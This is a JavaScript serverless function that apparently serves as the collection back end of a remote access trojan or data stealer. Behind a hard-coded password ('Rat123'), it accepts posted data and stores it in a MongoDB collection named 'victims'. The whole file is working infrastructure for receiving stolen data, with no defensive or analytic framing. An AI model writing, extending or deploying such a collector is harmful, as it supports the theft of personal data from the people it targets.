// functions/logger.js
const { MongoClient } = require('mongodb');

const MONGODB_URI = process.env.MONGODB_URI;
const DB_NAME = 'logger';
const COLLECTION = 'victims';

exports.handler = async (event, context) => {
  // Only allow POST
  if (event.httpMethod !== 'POST') {
    return { statusCode: 405, body: 'Method Not Allowed' };
  }

  try {
    // Parse the body
    const body = JSON.parse(event.body);
    const { password, data } = body;
    
    // Check password
    if (password !== 'Rat123') {
      return {
        statusCode: 401,
        body: JSON.stringify({ success: false, message: 'Unauthorized' })
      };
    }

    // Validate data
    if (!data) {
      return {
        statusCode: 400,
        body: JSON.stringify({ success: false, message: 'No data provided' })
      };
    }

    // Connect to MongoDB (if URI exists)
    if (MONGODB_URI) {
      const client = new MongoClient(MONGODB_URI);
      await client.connect();
      const db = client.db(DB_NAME);
      const collection = db.collection(COLLECTION);

      // Insert the data
      const result = await collection.insertOne({
        ...data,
        receivedAt: new Date()
      });

      await client.close();
      
      return {
        statusCode: 200,
        body: JSON.stringify({ 
          success: true, 
          id: result.insertedId 
        })
      };
    } else {
      // No MongoDB - just return success for testing
      return {
        statusCode: 200,
        body: JSON.stringify({ 
          success: true, 
          message: 'Data received (MongoDB not configured)',
          data: data
        })
      };
    }

  } catch (error) {
    console.error('Error:', error);
    return {
      statusCode: 500,
      body: JSON.stringify({ 
        success: false, 
        error: error.message 
      })
    };
  }
};